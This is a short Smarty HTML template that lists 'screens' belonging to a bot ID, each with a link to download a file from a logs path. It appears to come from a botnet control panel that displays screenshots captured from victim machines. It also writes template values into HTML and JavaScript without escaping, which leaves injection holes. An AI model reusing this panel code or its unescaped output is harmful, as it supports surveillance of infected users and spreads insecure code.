<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
var id_bot_{$rand_name} = '{$bot->id}';
</script>

<script language="javascript" type="application/javascript">
document.getElementById(id_{$rand_name} + '_title').innerHTML = '{$Cur.str}';
</script>

<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc; text-align:center">
{foreach from=$items item=screen name=screens}
{if $smarty.foreach.screens.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{if $screen->file ne ''}<a href="/logs/download-8.html?file={$screen->file}" target="_blank">{$screen->file}</a>{else}-{/if}</th>
    <th>{if $screen->desc ne ''}{$screen->desc}{else}-{/if}</th>
    <th>{$screen->type}</th>
    <th>{$screen->post_date}</th>
</tr>
{/foreach}
</table>